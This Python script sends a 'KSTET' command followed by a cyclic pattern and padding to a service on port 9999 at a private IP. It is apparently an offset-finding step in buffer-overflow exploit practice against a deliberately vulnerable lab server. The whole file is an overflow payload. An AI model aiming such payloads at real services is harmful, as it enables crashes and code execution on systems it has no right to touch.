import socket
import struct

TCP_IP = '192.168.109.129'
TCP_PORT = 9999


payload = "KSTET /.:/"
payload += "Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9"
payload += "D" * (5990 - len(payload))
	
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((TCP_IP, TCP_PORT))

s.send(payload)
s.close()	